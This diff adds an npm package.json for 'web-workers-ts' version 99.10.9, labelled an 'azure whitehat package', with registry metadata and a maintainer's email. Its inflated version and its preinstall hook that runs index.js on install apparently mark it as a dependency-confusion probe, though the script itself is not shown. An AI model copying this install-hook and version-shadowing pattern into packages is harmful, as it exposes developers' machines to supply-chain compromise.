@@ -1,0 +1,39 @@
+{
+    "name": "web-workers-ts",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "web-workers-ts@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-BSZJZtpW46Dv+kfjXIzrKkPaMD3trUR2IO8VAR6i+p4F/v2/mNy5C1GdUlEUG3oj7TxHP9RAV+DZOMzGDK688Q==",
+        "shasum": "daf48b6d9006e663e28d2f6c7e65c411a491986a",
+        "tarball": "https://registry.npmjs.org/web-workers-ts/-/web-workers-ts-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3578,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhooJ7CRA9TVsSAnZWagAAOhcQAKG6B4uHPm6M26q1iMc3\n2fV0rLccwJ+7UgExS+RKn7efx4AasKBXnQHqswaQla5hX8Ho7ac3rjhzIczJ\n2jDEHBxYOTdd8qSfCLvZI0WJfW+zhhQNscRFQ8LermJYXmm4Gox+KaY/viZ6\nUi81htExr8tGAyQX3iE5zdCefXhieQ5WFCPrk4NEHoqwJ+hCSZKO1dkDgTGY\nPFe/2uA/IZ752L8+vTJAsZTtPx3wJqUNgxNs+/ID7gP9aKAyG58f1CDn+H/S\nmsR+NUJm/t+S0gX+/4qa2CQZCgwyQGr2F81jwBbsPYbIS9S+3FnLQFdFnIvF\nDDON2pLnr6SnY3UnXLvIejbYjtJb4I4xAtGPLEJdrP7XliKNfa8GopF9bAwv\n6zCo0KWmGkqtmoBPYzu2EcFPwrjrXHx1Bt+DFq9QER6bxfyq1eq0SZQbouAl\nY/qBFudSCZ5SaqKs8xYf30d1um3HYbxikJPFzmVMv7A0BmXkhWgR66ePfe5W\n1hI+LG9oojdIKL6lkgd/U1Hz35jd4vn5xIqV9VzClhGXO9/EPXR2fkNCuFCy\nizFVsLL2IvnINX7AaZ4uu1HQSyudsZAn/4gEvI0C7tcL9xCCzNUiMmFc1rLQ\nmoD3GKQKQ9GCVOHNgiQv8JG8hFCUixVAV8181Ts1hoRWcA0yaxHFU1lgOXc8\nf2vf\r\n=R5KH\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/web-workers-ts_99.10.9_1638040187824_0.5193172334722722"
+    },
+    "_hasShrinkwrap": false
+}
